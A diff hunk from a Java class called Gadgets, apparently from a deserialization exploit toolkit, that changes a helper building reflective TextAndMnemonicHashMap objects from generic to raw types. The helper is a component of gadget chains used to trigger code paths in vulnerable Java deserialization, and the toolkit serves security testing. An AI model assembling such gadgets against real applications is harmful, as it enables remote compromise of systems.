@@ -263,9 +263,9 @@ public class Gadgets extends ClassLoader {
         return className;
     }
 
-    public static HashMap<Object,?> maskmapToString(Object o1, Object o2) throws Exception {
-        Map<Object,?> tHashMap1 = (Map<Object,?>) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
-        Map<Object,?> tHashMap2 = (Map<Object,?>) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
+    public static HashMap maskmapToString(Object o1, Object o2) throws Exception {
+        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
+        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
         tHashMap1.put(o1, null);
         tHashMap2.put(o2, null);
         Reflections.setFieldValue(tHashMap1, "loadFactor", 1);
